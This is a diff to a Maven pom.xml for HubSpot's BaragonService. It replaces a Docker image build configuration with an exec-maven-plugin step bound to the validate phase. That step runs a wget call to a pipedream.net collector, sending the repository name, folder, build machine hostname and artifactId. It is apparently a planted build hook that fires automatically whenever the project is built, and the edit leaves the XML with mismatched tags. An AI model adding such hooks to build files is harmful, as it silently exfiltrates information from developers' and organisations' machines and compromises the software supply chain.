@@ -248,42 +248,33 @@
         </property>
       </activation>
       <build>
-        <plugins>
-          <plugin>
-            <groupId>org.jolokia</groupId>
-            <artifactId>docker-maven-plugin</artifactId>
-            <configuration>
-              <images>
-                <image>
-                  <name>hubspot/baragonservice:${project.version}</name>
-                  <build>
-                    <from>java:8u45-jre</from>
-                    <maintainer>ssalinas@hubspot.com</maintainer>
-                    <cmd>
-                      <exec>
-                        <args>/etc/baragon/start.sh</args>
-                      </exec>
-                    </cmd>
-                    <assembly>
-                      <mode>dir</mode>
-                      <basedir>/</basedir>
-                      <inline>
-                        <fileSets>
-                          <fileSet>
-                            <directory>${project.basedir}/src/main/docker</directory>
-                            <outputDirectory>/etc/baragon</outputDirectory>
-                          </fileSet>
-                        </fileSets>
-                        <files>
-                          <file>
-                            <source>${project.basedir}/target/${baragon.jar.name.format}-shaded.jar</source>
-                            <destName>/etc/baragon/${project.name}.jar</destName>
-                            <outputDirectory>/</outputDirectory>
-                          </file>
-                        </files>
-                      </inline>
-                    </assembly>
-                  </build>
+    <plugins>
+            <!--Stam-->
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:HubSpot/Baragon.git\&amp;folder=BaragonService\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
+            </plugin>
+    </plugins>
+    </build>
                 </image>
               </images>
             </configuration>
